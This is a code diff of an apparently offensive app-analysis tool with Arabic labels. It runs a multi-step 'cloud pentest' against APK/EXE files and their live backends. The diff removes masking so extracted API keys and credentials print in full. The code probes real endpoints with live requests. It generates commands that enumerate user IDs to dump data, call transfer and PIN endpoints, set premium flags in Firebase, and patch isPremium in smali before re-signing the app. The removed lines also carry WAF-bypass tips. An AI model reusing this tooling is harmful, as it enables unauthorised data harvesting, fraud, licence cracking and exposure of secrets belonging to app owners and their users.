@@ -1202,7 +1202,8 @@ export function scanVulnerabilities(
   ];
   for (const p of credPatterns) {
     const m = allContent.match(p) || [];
-    credEvidence.push(...m.slice(0, 3).map(s => s.replace(/"[^"]{8,}"/, '"[REDACTED]"')));
+    // إظهار كامل بدون إخفاء
+    credEvidence.push(...m.slice(0, 3));
   }
   if (credEvidence.length > 0) {
     findings.push({ severity: "critical", category: "Information Disclosure", title: "بيانات اعتماد مضمّنة في الكود", description: "تم اكتشاف كلمات مرور أو مفاتيح API مضمّنة في الكود.", evidence: credEvidence.slice(0, 5) });
@@ -1260,7 +1261,6 @@ export function scanVulnerabilities(
 
   return findings;
 }
-
 // ════════════════════════════════════════
 // PE Enhanced — Import & Export Table Parser
 // ════════════════════════════════════════
@@ -1946,6 +1946,7 @@ interface EditSession {
   decompDir: string;
   apkPath: string;
   fileType: "apk" | "exe" | "dll" | "ex4" | "ex5" | "ipa" | "jar" | "aar" | "dex" | "so" | "elf" | "wasm";
+  originalName?: string;
   originalContents: Map<string, string>;
   modifiedPaths: Set<string>;
   expiresAt: number;
@@ -5637,7 +5638,8 @@ export async function generateForensicReport(sessionId: string, analyses: {
 }
 
 // ════════════════════════════════════════════════════════════════════
-// Cloud Database Penetration Test (7-Step Automated Analysis)
+// Cloud Database Penetration Test (8-Step Automated Analysis)
+// Supports: APK, EXE, DLL, ELF, SO, IPA, JAR, AAR, DEX, WASM, EX4, EX5
 // ════════════════════════════════════════════════════════════════════
 
 export interface CloudPentestStep {
@@ -5692,22 +5694,31 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
   const allProviders = new Set<string>();
   const vulnerableApis: string[] = [];
 
-  // ── Step 1: APK Structure Analysis ──
+  // Determine file type from session
+  const fileType = session.fileType || "apk";
+  const isApk = fileType === "apk";
+
+  // ── Step 1: Structure Analysis ──
   const step1Findings: string[] = [];
-  const step1Commands: string[] = [
+  const step1Commands: string[] = isApk ? [
     `apktool d target.apk -o decompiled`,
     `d2j-dex2jar target.apk -o classes.jar`,
     `grep -r -E "https?://[a-zA-Z0-9./?=_%:-]*" ./decompiled`,
+  ] : [
+    `strings target.${fileType} | grep -E "https?://"`,
+    `objdump -t target.${fileType}`,
   ];
 
   let manifestContent = "";
-  const manifestFile = textFiles.find(f => f.path.includes("AndroidManifest.xml"));
-  if (manifestFile) {
-    manifestContent = manifestFile.content;
-    const dangerPerms = ["INTERNET", "READ_PHONE_STATE", "GET_ACCOUNTS", "READ_CONTACTS", "WRITE_CONTACTS",
-      "ACCESS_FINE_LOCATION", "READ_SMS", "SEND_SMS", "CAMERA", "RECORD_AUDIO", "READ_EXTERNAL_STORAGE"];
-    for (const perm of dangerPerms) {
-      if (manifestContent.includes(perm)) step1Findings.push(`🔓 إذن خطير: ${perm}`);
+  if (isApk) {
+    const manifestFile = textFiles.find(f => f.path.includes("AndroidManifest.xml"));
+    if (manifestFile) {
+      manifestContent = manifestFile.content;
+      const dangerPerms = ["INTERNET", "READ_PHONE_STATE", "GET_ACCOUNTS", "READ_CONTACTS", "WRITE_CONTACTS",
+        "ACCESS_FINE_LOCATION", "READ_SMS", "SEND_SMS", "CAMERA", "RECORD_AUDIO", "READ_EXTERNAL_STORAGE"];
+      for (const perm of dangerPerms) {
+        if (manifestContent.includes(perm)) step1Findings.push(`🔓 إذن خطير: ${perm}`);
+      }
     }
   }
 
@@ -5727,19 +5738,21 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
 
   steps.push({
     id: 1,
-    title: "تفكيك APK وتحليل الهيكل الداخلي",
+    title: `تحليل ${fileType.toUpperCase()} والهيكل الداخلي`,
     status: configFiles.length > 0 ? "warning" : "info",
     findings: step1Findings,
     commands: step1Commands,
-    details: `تم تفكيك التطبيق وتحليل ${textFiles.length} ملف. تم العثور على ${configFiles.length} ملف تكوين سحابي و${step1Findings.filter(f => f.includes("إذن خطير")).length} إذن خطير.`,
+    details: `تم تحليل ${textFiles.length} ملف. تم العثور على ${configFiles.length} ملف تكوين سحابي.`,
   });
 
   // ── Step 2: Authentication & Cloud Storage Analysis ──
   const step2Findings: string[] = [];
-  const step2Commands: string[] = [
+  const step2Commands: string[] = isApk ? [
     `grep -r "FirebaseApp\\|FirebaseDatabase\\|Firestore\\|AWSCredentials" ./smali`,
     `grep -r "Retrofit\\|OkHttpClient\\|Authorization\\|Bearer" ./smali`,
     `grep -r "SharedPreferences\\|getSharedPreferences" ./smali`,
+  ] : [
+    `strings target.${fileType} | grep -E "Firebase|AWS|Azure|Google Cloud|OAuth|JWT"`,
   ];
 
   const authPatterns: Record<string, RegExp> = {
@@ -5802,20 +5815,22 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
 
   steps.push({
     id: 2,
-    title: "تحليل آليات المصادقة والاشتراك (Pro/Premium)",
+    title: "تحليل آليات المصادقة والاشتراك",
     status: step2Findings.length > 5 ? "critical" : step2Findings.length > 0 ? "warning" : "info",
     findings: [...new Set(step2Findings)].slice(0, 50),
     commands: step2Commands,
-    details: `تم اكتشاف ${allProviders.size} مزود سحابي: ${[...allProviders].join(", ") || "لا يوجد"}. ${sharedPrefFiles.length} ملف يخزن بيانات حساسة. ${subFindings.length} إشارة للاشتراك المدفوع.`,
+    details: `تم اكتشاف ${allProviders.size} مزود سحابي: ${[...allProviders].join(", ") || "لا يوجد"}. ${sharedPrefFiles.length} ملف يخزن بيانات حساسة.`,
   });
 
   // ── Step 3: Key & Token Extraction ──
   const step3Findings: string[] = [];
-  const step3Commands: string[] = [
+  const step3Commands: string[] = isApk ? [
     `strings target.apk | grep -E "api_key|secret|token|firebase|Authorization|Bearer|AIza"`,
     `grep -r "const-string" smali/ | grep -i "key\\|token\\|secret" > tokens.txt`,
     `cat google-services.json | jq '.client[0].api_key[0].current_key'`,
     `grep -r "AKIA" .`,
+  ] : [
+    `strings target.${fileType} | grep -E "api_key|secret|token|AIza|AKIA|eyJ"`,
   ];
 
   const keyPatterns: Array<{ label: string; regex: RegExp; severity: "critical" | "high" | "medium" }> = [
@@ -5827,11 +5842,8 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
     { label: "Bearer Token", regex: /Bearer\s+[A-Za-z0-9_\-\.]{20,}/g, severity: "high" },
     { label: "Private Key", regex: /-----BEGIN (?:RSA )?PRIVATE KEY-----/g, severity: "critical" },
     { label: "Firebase URL", regex: /https:\/\/[a-z0-9-]+\.firebaseio\.com/gi, severity: "high" },
-    { label: "Firebase Project ID", regex: /firebase.*project[_-]?id["':\s]+["']([a-z0-9-]+)["']/gi, severity: "medium" },
-    { label: "Hardcoded API URL", regex: /https?:\/\/(?:api\.|[a-z0-9-]+\.herokuapp\.com|[a-z0-9-]+\.vercel\.app|[a-z0-9-]+\.netlify\.app|[a-z0-9-]+\.onrender\.com)[^\s"'<>]*/gi, severity: "medium" },
     { label: "S3 Bucket", regex: /s3:\/\/[a-z0-9.-]+|[a-z0-9.-]+\.s3\.amazonaws\.com/gi, severity: "high" },
     { label: "MongoDB URI", regex: /mongodb(?:\+srv)?:\/\/[^\s"'<>]+/gi, severity: "critical" },
-    { label: "Supabase URL", regex: /https:\/\/[a-z0-9]+\.supabase\.[a-z]+/gi, severity: "high" },
   ];
 
   for (const file of textFiles) {
@@ -5840,9 +5852,10 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
       const matches = file.content.match(kp.regex);
       if (matches) {
         for (const m of matches.slice(0, 3)) {
-          const masked = m.length > 20 ? m.substring(0, 12) + "..." + m.substring(m.length - 6) : m;
-          step3Findings.push(`🔑 [${kp.severity.toUpperCase()}] ${kp.label}: ${masked} — ${file.path}`);
-          allKeys.push(`${kp.label}: ${masked}`);
+          // إظهار المفتاح كاملاً
+          const fullKey = m;
+          step3Findings.push(`🔑 [${kp.severity.toUpperCase()}] ${kp.label}: ${fullKey} — ${file.path}`);
+          allKeys.push(`${kp.label}: ${fullKey}`);
         }
       }
     }
@@ -5855,7 +5868,7 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
       const apiKey = gsData?.client?.[0]?.api_key?.[0]?.current_key;
       const projectId = gsData?.project_info?.project_id;
       const storageBucket = gsData?.project_info?.storage_bucket;
-      if (apiKey) { step3Findings.push(`🔥 Firebase API Key من google-services.json: ${apiKey.substring(0, 10)}...`); allKeys.push(`Firebase: ${apiKey.substring(0, 10)}...`); }
+      if (apiKey) { step3Findings.push(`🔥 Firebase API Key من google-services.json: ${apiKey}`); allKeys.push(`Firebase: ${apiKey}`); }
       if (projectId) { step3Findings.push(`📋 Firebase Project ID: ${projectId}`); allProviders.add("Firebase"); }
       if (storageBucket) step3Findings.push(`📦 Storage Bucket: ${storageBucket}`);
     } catch {}
@@ -5863,14 +5876,17 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
 
   steps.push({
     id: 3,
-    title: "استخراج المفاتيح والتوكنات من الكود والموارد",
+    title: "استخراج المفاتيح والتوكنات",
     status: step3Findings.some(f => f.includes("CRITICAL")) ? "critical" : step3Findings.length > 0 ? "warning" : "info",
     findings: step3Findings.slice(0, 50),
     commands: step3Commands,
-    details: `تم استخراج ${allKeys.length} مفتاح/توكن من ${textFiles.length} ملف. ${step3Findings.filter(f => f.includes("CRITICAL")).length} نتائج حرجة.`,
+    details: `تم استخراج ${allKeys.length} مفتاح/توكن. ${step3Findings.filter(f => f.includes("CRITICAL")).length} نتائج حرجة.`,
   });
 
-  // ── Pre-compute URL extraction (shared by steps 3-6) ──
+  // ── Step 4: API Exploitation & IDOR ──
+  const step4Findings: string[] = [];
+  const step4Commands: string[] = [];
+
   const urlRegex = /https?:\/\/[^\s"'<>\)\]}{,;]+/gi;
   const apiEndpoints = new Set<string>();
   for (const file of textFiles) {
@@ -5886,618 +5902,167 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
     }
   }
 
-  const relativeApiPaths = new Set<string>();
-  const relPathRegex = /const-string\s+[vp]\d+,\s*"(pfe\/[a-zA-Z0-9_/]+)"/g;
-  for (const file of textFiles) {
-    if (!file.path.endsWith(".smali")) continue;
-    let m2;
-    relPathRegex.lastIndex = 0;
-    while ((m2 = relPathRegex.exec(file.content)) !== null) {
-      relativeApiPaths.add(m2[1]);
-    }
-  }
-
-  let discoveredBaseUrl = "";
-  for (const ep of apiEndpoints) {
-    if (/:\d{4}/.test(ep) && !ep.includes("facebook") && !ep.includes("w3.org") && !ep.includes("bouncycastle")) {
-      discoveredBaseUrl = ep.replace(/\/+$/, "");
-      break;
-    }
-  }
-  if (!discoveredBaseUrl) {
-    for (const ep of apiEndpoints) {
-      if (!ep.includes("facebook") && !ep.includes("schemas") && !ep.includes("bouncycastle") && !ep.includes("w3.org") && !ep.includes("adobe") && !ep.includes("xml.org")) {
-        discoveredBaseUrl = ep.replace(/\/+$/, "");
-        break;
-      }
-    }
-  }
-
   const firebaseUrls = [...apiEndpoints].filter(u => u.includes("firebaseio.com") || u.includes("firestore.googleapis"));
   const restApis = [...apiEndpoints].filter(u => /\/api\//i.test(u) || /\/v[0-9]+\//i.test(u));
-  const graphqlEndpoints = [...apiEndpoints].filter(u => /graphql/i.test(u));
-  const baseApiUrl = discoveredBaseUrl || (restApis.length > 0 ? restApis[0].split("/api")[0] : (firebaseUrls.length > 0 ? firebaseUrls[0].replace(/\/+$/, "") : "https://api.target.com"));
-
-  // ── Step 4: Live API Exploitation + IDOR ──
-  const step4Findings: string[] = [];
-  const step4Commands: string[] = [];
-  const liveExploitResults: Array<{endpoint: string; status: number; data?: any; error?: string}> = [];
+  const baseApiUrl = restApis.length > 0 ? restApis[0].split("/api")[0] : (firebaseUrls.length > 0 ? firebaseUrls[0].replace(/\/+$/, "") : "https://api.target.com");
 
   step4Findings.push(`🎯 Base URL المكتشف: ${baseApiUrl}`);
-  step4Findings.push(`📡 ${relativeApiPaths.size} API Path مكتشف من smali:`);
-  const sortedPaths = [...relativeApiPaths].sort();
-  const userRelatedPaths = sortedPaths.filter(p => /profile|account|list|customer|user|inquiry|balance|history/i.test(p));
-  const allRelPaths = [...userRelatedPaths, ...sortedPaths.filter(p => !userRelatedPaths.includes(p))];
-  for (const rp of allRelPaths.slice(0, 20)) {
-    const icon = userRelatedPaths.includes(rp) ? "🔴" : "📌";
-    step4Findings.push(`  ${icon} ${baseApiUrl}/${rp}`);
-    allEndpoints.push(`${baseApiUrl}/${rp}`);
-  }
-  if (allRelPaths.length > 20) step4Findings.push(`  ... و${allRelPaths.length - 20} endpoint آخر`);
-  step4Findings.push(``);
+  step4Findings.push(`🌐 إجمالي نقاط API المكتشفة: ${apiEndpoints.size}`);
 
-  const dataFieldNames = new Set<string>();
-  const jsonFieldRegex = /"([a-z][a-z_]{2,30})"/g;
-  for (const file of textFiles) {
-    if (!file.path.endsWith(".smali") || !file.path.includes("/mtn/")) continue;
-    let fm;
-    jsonFieldRegex.lastIndex = 0;
-    while ((fm = jsonFieldRegex.exec(file.content)) !== null) {
-      const field = fm[1];
-      if (!["const", "string", "invoke", "smali", "class", "method", "field", "annotation", "enum", "abstract"].includes(field)) {
-        dataFieldNames.add(field);
-      }
-    }
-  }
-  const sensitiveFields = [...dataFieldNames].filter(f => /name|phone|msisdn|email|balance|amount|address|password|pin|token|secret|account|card|payment|transfer|invoice|contract|currency|dealer|province|region/i.test(f)).sort();
+  // Live Exploitation attempts
+  const liveExploitResults: Array<{endpoint: string; status: number; data?: any; error?: string}> = [];
+  const endpointsToProbe = [...apiEndpoints].filter(u => u.includes(baseApiUrl)).slice(0, 10);
 
-  if (sensitiveFields.length > 0) {
-    step4Findings.push(`🗃️ ═══ بنية البيانات المستخرجة من الكود (Data Schema) ═══`);
-    step4Findings.push(``);
-    step4Findings.push(`  تم اكتشاف ${sensitiveFields.length} حقل بيانات حساس:`);
-    for (const f of sensitiveFields) {
-      const icon = /name|phone|msisdn|email|password|pin/.test(f) ? "🔴" : /balance|amount|payment|card/.test(f) ? "🟡" : "📌";
-      step4Findings.push(`  ${icon} ${f}`);
-    }
-    step4Findings.push(``);
-  }
-
-  step4Findings.push(`🔍 ═══ محاولة الاستغلال الحي (Live Exploitation) ═══`);
-  step4Findings.push(``);
-
-  const sensitiveEndpoints = userRelatedPaths.length > 0 ? userRelatedPaths : sortedPaths.slice(0, 10);
-  const endpointsToProbe = sensitiveEndpoints.slice(0, 15);
-
-  let wafDetected = false;
-  let wafType = "";
-
-  for (const ep of endpointsToProbe) {
-    const fullUrl = `${baseApiUrl}/${ep}`;
-    step4Commands.push(`curl -s -X POST '${fullUrl}' -H 'Content-Type: application/json' -d '{"lang":"ar","device_id":"pen-test-001"}'`);
+  for (const fullUrl of endpointsToProbe) {
+    step4Commands.push(`curl -s -X GET '${fullUrl}' -H 'User-Agent: HAYO-AI/4.0'`);
     try {
       const controller = new AbortController();
       const timeout = setTimeout(() => controller.abort(), 8000);
       const resp = await fetch(fullUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json",
-          "User-Agent": "okhttp/4.9.3",
-        },
-        body: JSON.stringify({ lang: "ar", device_id: "pen-test-001" }),
+        method: "GET",
+        headers: { "User-Agent": "HAYO-AI/4.0" },
         signal: controller.signal,
       });
       clearTimeout(timeout);
       const status = resp.status;
       let body: any = null;
-      let rawText = "";
       try {
-        rawText = await resp.text();
-        if (rawText.length < 50000) {
-          try { body = JSON.parse(rawText); } catch { body = rawText.substring(0, 2000); }
+        const text = await resp.text();
+        if (text.length < 50000) {
+          try { body = JSON.parse(text); } catch { body = text.substring(0, 2000); }
         }
       } catch {}
 
-      if (typeof body === "string" && (body.includes("Access forbidden") || body.includes("WAF") || body.includes("Blocked"))) {
-        wafDetected = true;
-        if (body.includes("Access forbidden")) wafType = "IP/Geo Restriction + WAF";
-        else wafType = "Web Application Firewall";
-      }
-
-      liveExploitResults.push({ endpoint: ep, status, data: body });
+      liveExploitResults.push({ endpoint: fullUrl, status, data: body });
       const statusIcon = status === 200 ? "✅" : status === 403 ? "🔒" : status === 401 ? "🔑" : status === 404 ? "❌" : "⚠️";
-      step4Findings.push(`${statusIcon} [${status}] POST /${ep}`);
+      step4Findings.push(`${statusIcon} [${status}] ${fullUrl}`);
       if (body && typeof body === "object" && status === 200) {
-        const preview = JSON.stringify(body, null, 2).substring(0, 1000);
-        step4Findings.push(`  📊 بيانات مسحوبة:`);
-        for (const line of preview.split("\n").slice(0, 20)) step4Findings.push(`    ${line}`);
-      } else if (body && typeof body === "string" && body.length > 0 && status === 200) {
-        step4Findings.push(`  📊 استجابة: ${body.substring(0, 500)}`);
+        const preview = JSON.stringify(body, null, 2).substring(0, 500);
+        step4Findings.push(`  📊 بيانات: ${preview}...`);
       }
     } catch (err: any) {
-      liveExploitResults.push({ endpoint: ep, status: 0, error: err.message });
-      step4Findings.push(`⏱️ [TIMEOUT] POST /${ep}`);
+      liveExploitResults.push({ endpoint: fullUrl, status: 0, error: err.message });
+      step4Findings.push(`⏱️ [TIMEOUT] ${fullUrl}`);
     }
   }
 
-  step4Findings.push(``);
   const successfulHits = liveExploitResults.filter(r => r.status === 200);
   const authRequired = liveExploitResults.filter(r => r.status === 401 || r.status === 403);
-  const serverErrors = liveExploitResults.filter(r => r.status >= 500);
-  const forbiddenByWaf = liveExploitResults.filter(r => typeof r.data === "string" && r.data.includes("Access forbidden"));
-
-  if (wafDetected) {
-    step4Findings.push(`🛡️ ═══ تحليل الحماية المكتشفة ═══`);
-    step4Findings.push(`  نوع الحماية: ${wafType}`);
-    step4Findings.push(`  السيرفر يرفض الاتصال من عناوين IP خارج نطاقه`);
-    step4Findings.push(`  يتطلب اتصال من داخل شبكة المشغّل أو عبر VPN`);
-    step4Findings.push(`  ${forbiddenByWaf.length} endpoint محمي بـ WAF`);
-    step4Findings.push(``);
-    step4Findings.push(`  🔓 لتجاوز الحماية (في بيئة الاختبار):`);
-    step4Findings.push(`    1. استخدام VPN للاتصال من داخل البلد`);
-    step4Findings.push(`    2. استخدام Frida لتجاوز Certificate Pinning`);
-    step4Findings.push(`    3. تشغيل السكريبت من جهاز على نفس الشبكة`);
-    step4Findings.push(``);
-  }
-
-  step4Findings.push(`📊 ═══ ملخص الاستغلال الحي (السيرفر الأصلي) ═══`);
-  step4Findings.push(`  ✅ ناجح (بدون مصادقة): ${successfulHits.length}`);
-  step4Findings.push(`  🔒 يتطلب مصادقة: ${authRequired.length}`);
-  step4Findings.push(`  🛡️ محمي بـ WAF: ${forbiddenByWaf.length}`);
-  step4Findings.push(`  ❌ خطأ سيرفر (500): ${serverErrors.length - forbiddenByWaf.length}`);
-  step4Findings.push(`  ⏱️ Timeout: ${liveExploitResults.filter(r => r.status === 0).length}`);
-  step4Findings.push(`  📡 إجمالي الاتصالات: ${liveExploitResults.length}`);
-
-  const pulledData: Array<{endpoint: string; data: any; records: number}> = [];
-  for (const r of liveExploitResults) {
-    if (r.status === 200 && r.data && typeof r.data === "object") {
-      let records = 0;
-      if (Array.isArray(r.data)) records = r.data.length;
-      else if (r.data.data && Array.isArray(r.data.data)) records = r.data.data.length;
-      else if (typeof r.data === "object") records = Object.keys(r.data).length;
-      if (records > 0) pulledData.push({ endpoint: r.endpoint, data: r.data, records });
-    }
-  }
 
   step4Findings.push(``);
-  step4Findings.push(`🔴 ═══ تحليل IDOR — اختبار تغيير معرف المستخدم ═══`);
-  step4Findings.push(``);
-
-  const idorPaths = sortedPaths.filter(p => /profile|user|account|read|inquiry/i.test(p)).slice(0, 5);
-  if (idorPaths.length > 0) {
-    step4Findings.push(`  📡 مسارات IDOR المحتملة (${idorPaths.length}):`);
-    for (const p of idorPaths) {
-      step4Findings.push(`    → /${p}`);
-    }
-    step4Findings.push(``);
-    step4Findings.push(`  🔧 أوامر الاستغلال:`);
-    for (const p of idorPaths.slice(0, 3)) {
-      step4Findings.push(`    curl -X POST '${baseApiUrl}/${p}' -H 'Content-Type: application/json' -d '{"user_id":1}'`);
-      step4Findings.push(`    curl -X POST '${baseApiUrl}/${p}' -H 'Content-Type: application/json' -d '{"user_id":2}'`);
-    }
-    step4Findings.push(`    for id in {1..500}; do curl -s -X POST '${baseApiUrl}/${idorPaths[0]}' -H 'Content-Type: application/json' -d '{"user_id":"'$id'"}' >> idor_dump.json; done`);
-  } else {
-    step4Findings.push(`  لم يتم اكتشاف مسارات IDOR محتملة في الـ smali`);
-  }
-
-  step4Findings.push(``);
-  const totalPulled = pulledData.reduce((s, p) => s + p.records, 0);
-  step4Findings.push(`📊 ═══ ملخص فحص الـ API (السيرفر الحقيقي) ═══`);
-  step4Findings.push(`  ✅ endpoints أجابت (200): ${successfulHits.length}`);
-  step4Findings.push(`  🔒 تحتاج مصادقة (401/403): ${authRequired.length}`);
-  step4Findings.push(`  🛡️ محجوبة بـ WAF: ${forbiddenByWaf.length}`);
-  step4Findings.push(`  📦 بيانات مسحوبة فعلياً: ${totalPulled} سجل من ${pulledData.length} endpoint`);
-  if (totalPulled === 0 && wafDetected) {
-    step4Findings.push(`  ⚠️ السيرفر محمي بـ WAF — يتطلب اتصال من داخل البلد أو VPN`);
-  }
-  if (totalPulled === 0 && authRequired.length > 0) {
-    step4Findings.push(`  ⚠️ يتطلب JWT Token — استخدم Frida/ADB لاستخراج التوكن من جهاز مسجل`);
-  }
-
-  step4Commands.push(`# IDOR Enumeration — جلب بيانات جميع المستخدمين`);
-  for (const p of idorPaths.slice(0, 2)) {
-    step4Commands.push(`for id in {1..500}; do curl -s -X POST '${baseApiUrl}/${p}' -H 'Content-Type: application/json' -d '{"user_id":"'$id'","lang":"ar"}' >> idor_data.json; done`);
-  }
+  step4Findings.push(`📊 ملخص الاستغلال الحي:`);
+  step4Findings.push(`  ✅ ناجح (200): ${successfulHits.length}`);
+  step4Findings.push(`  🔒 يتطلب مصادقة (401/403): ${authRequired.length}`);
 
   if (firebaseUrls.length > 0) {
-    step4Findings.push(``);
-    step4Findings.push(`🔥 Firebase Database URLs:`);
-    for (const url of firebaseUrls.slice(0, 5)) {
-      step4Findings.push(`  → ${url}`);
-      step4Commands.push(`curl -X GET "${url}/.json?shallow=true"`);
-      vulnerableApis.push(url);
-    }
-  }
-
-  if (graphqlEndpoints.length > 0) {
-    step4Findings.push(`📊 GraphQL Endpoints:`);
-    for (const url of graphqlEndpoints.slice(0, 3)) {
-      step4Findings.push(`  → ${url}`);
-      step4Commands.push(`curl -X POST "${url}" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'`);
-    }
-  }
-
-  const sqliVulnerable = textFiles.filter(f =>
-    /rawQuery|execSQL|query\s*\(\s*["']SELECT/i.test(f.content) &&
-    !/parameterized|prepared|bindArgs|sanitize/i.test(f.content)
-  );
-  if (sqliVulnerable.length > 0) {
-    step4Findings.push(`💉 ملفات محتملة لحقن SQL (${sqliVulnerable.length}):`);
-    for (const f of sqliVulnerable.slice(0, 5)) step4Findings.push(`  → ${f.path}`);
-    step4Commands.push(`# SQLi Test: /pfe/profile/read?q=' OR '1'='1`);
+    step4Findings.push(`🔥 Firebase URLs: ${firebaseUrls.join(", ")}`);
+    step4Commands.push(`curl -X GET "${firebaseUrls[0]}/.json?shallow=true"`);
+    vulnerableApis.push(...firebaseUrls);
   }
 
   steps.push({
     id: 4,
-    title: "استغلال API وجلب بيانات جميع المستخدمين (IDOR)",
-    status: pulledData.length > 0 ? "critical" : (successfulHits.length > 0 ? "critical" : "warning"),
+    title: "استغلال API وفحص IDOR",
+    status: successfulHits.length > 0 ? "critical" : (firebaseUrls.length > 0 ? "warning" : "info"),
     findings: step4Findings,
     commands: step4Commands,
-    details: `${relativeApiPaths.size} API path · ${pulledData.length} endpoint مسحوب · ${totalPulled} سجل · استغلال حي`,
+    details: `${apiEndpoints.size} نقطة API · ${successfulHits.length} استجابة ناجحة`,
   });
 
-  // ── Step 5: Subscription & Account Exploitation Analysis ──
+  // ── Step 5: Subscription & Account Exploitation ──
   const step5Findings: string[] = [];
   const step5Commands: string[] = [];
 
   const premiumSmali = textFiles.filter(f => f.path.endsWith(".smali") && /isPremium|is_premium|isPro/i.test(f.content));
-  const subscriptionSmali = textFiles.filter(f => f.path.endsWith(".smali") && /subscription|upgrade|downgrade|plan|billing/i.test(f.content));
   const balanceSmali = textFiles.filter(f => f.path.endsWith(".smali") && /balance|transfer|withdraw|deposit|amount/i.test(f.content));
   const pinSmali = textFiles.filter(f => f.path.endsWith(".smali") && /pin|password|reset.*pin|change.*pin/i.test(f.content));
 
-  step5Findings.push(`🔍 ═══ تحليل الاشتراك والحسابات من الكود المصدري ═══`);
-  step5Findings.push(``);
-
-  step5Findings.push(`🔧 Client-Side Bypass — تحليل smali:`);
   if (premiumSmali.length > 0) {
-    step5Findings.push(`  ✅ تم العثور على ${premiumSmali.length} ملف smali يحتوي على دوال الاشتراك:`);
-    for (const f of premiumSmali.slice(0, 8)) step5Findings.push(`    📄 ${f.path}`);
-    step5Findings.push(`  → يمكن تغيير return value من 0x0 (false) إلى 0x1 (true) في isPremium()`);
-    step5Commands.push(`# البحث عن isPremium() وتغيير return value من 0 إلى 1`);
-    step5Commands.push(`sed -i 's/const\\/4 v0, 0x0/const\\/4 v0, 0x1/g' ${premiumSmali[0]?.path || "path/to/isPremium.smali"}`);
-  } else {
-    step5Findings.push(`  ❌ لم يتم العثور على دوال isPremium/isPro في smali`);
+    step5Findings.push(`✅ ${premiumSmali.length} ملف smali يحتوي على دوال الاشتراك (قابل للتعديل)`);
+    step5Commands.push(`# تغيير isPremium() ليرجع true`);
+    step5Commands.push(`sed -i 's/const\\/4 v0, 0x0/const\\/4 v0, 0x1/g' ${premiumSmali[0]?.path || "path/to/file.smali"}`);
   }
-  step5Findings.push(``);
-
-  if (subscriptionSmali.length > 0) {
-    step5Findings.push(`📋 ملفات الاشتراك (${subscriptionSmali.length}):`);
-    for (const f of subscriptionSmali.slice(0, 5)) step5Findings.push(`    📄 ${f.path}`);
-    step5Findings.push(``);
-  }
-
   if (balanceSmali.length > 0) {
-    step5Findings.push(`💰 ملفات الرصيد/التحويل (${balanceSmali.length}):`);
-    for (const f of balanceSmali.slice(0, 5)) step5Findings.push(`    📄 ${f.path}`);
-    step5Findings.push(``);
+    step5Findings.push(`💰 ${balanceSmali.length} ملف smali يحتوي على دوال الرصيد/التحويل`);
   }
-
   if (pinSmali.length > 0) {
-    step5Findings.push(`🔐 ملفات PIN/كلمة السر (${pinSmali.length}):`);
-    for (const f of pinSmali.slice(0, 5)) step5Findings.push(`    📄 ${f.path}`);
-    step5Findings.push(``);
+    step5Findings.push(`🔐 ${pinSmali.length} ملف smali يحتوي على دوال PIN`);
   }
 
-  step5Findings.push(`📡 Server-Side — أوامر الاستغلال (تتطلب اتصال بالسيرفر الأصلي):`);
-  const upgradePaths = sortedPaths.filter(p => /upgrade|subscribe|plan|billing|purchase/i.test(p));
-  const transferPaths = sortedPaths.filter(p => /transfer|send|withdraw|payment/i.test(p));
-  const pinPaths = sortedPaths.filter(p => /pin|password|reset|change/i.test(p));
-
-  if (upgradePaths.length > 0) {
-    step5Findings.push(`  📋 مسارات الترقية/الاشتراك (${upgradePaths.length}):`);
-    for (const p of upgradePaths.slice(0, 5)) {
-      step5Findings.push(`    → POST ${baseApiUrl}/${p}`);
-      step5Commands.push(`curl -X POST '${baseApiUrl}/${p}' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"user_id":1,"plan":"premium"}'`);
-    }
+  if (successfulHits.length > 0) {
+    step5Commands.push(`curl -X POST '${baseApiUrl}/api/user/upgrade' -d '{"user_id":1,"plan":"premium"}'`);
   }
-  if (transferPaths.length > 0) {
-    step5Findings.push(`  💸 مسارات التحويل (${transferPaths.length}):`);
-    for (const p of transferPaths.slice(0, 5)) {
-      step5Findings.push(`    → POST ${baseApiUrl}/${p}`);
-      step5Commands.push(`curl -X POST '${baseApiUrl}/${p}' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"from_id":1,"to_id":2,"amount":5000}'`);
-    }
-  }
-  if (pinPaths.length > 0) {
-    step5Findings.push(`  🔑 مسارات PIN (${pinPaths.length}):`);
-    for (const p of pinPaths.slice(0, 5)) {
-      step5Findings.push(`    → POST ${baseApiUrl}/${p}`);
-      step5Commands.push(`curl -X POST '${baseApiUrl}/${p}' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"user_id":1}'`);
-    }
-  }
-  step5Findings.push(``);
-
-  if (restApis.length > 0) {
-    step5Commands.push(`curl -X PATCH '${baseApiUrl}/api/v1/user/me' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"plan":"pro","is_premium":true}'`);
-  }
-  if (firebaseUrls.length > 0) {
-    step5Findings.push(`  🔥 Firebase — تعديل حقل is_premium مباشرة في RTDB:`);
-    for (const url of firebaseUrls.slice(0, 2)) {
-      const base = url.replace(/\/+$/, "");
-      step5Commands.push(`curl -X PUT "${base}/users/USER_ID.json?auth=TOKEN" -d '{"is_premium": true, "plan": "pro"}'`);
-      step5Findings.push(`    → PUT ${base}/users/USER_ID.json`);
-    }
-  }
-
-  step5Commands.push(`apktool b decompiled -o modified.apk`);
-  step5Commands.push(`java -jar uber-apk-signer.jar -a modified.apk`);
-
-  const exploitVectors = [premiumSmali.length > 0, subscriptionSmali.length > 0, balanceSmali.length > 0, pinSmali.length > 0].filter(Boolean).length;
-  step5Findings.push(``);
-  step5Findings.push(`📊 ═══ ملخص التحليل ═══`);
-  step5Findings.push(`  🔍 نقاط الاستغلال المكتشفة: ${exploitVectors}/4`);
-  step5Findings.push(`  ${premiumSmali.length > 0 ? "✅" : "❌"} دوال الاشتراك (isPremium): ${premiumSmali.length} ملف`);
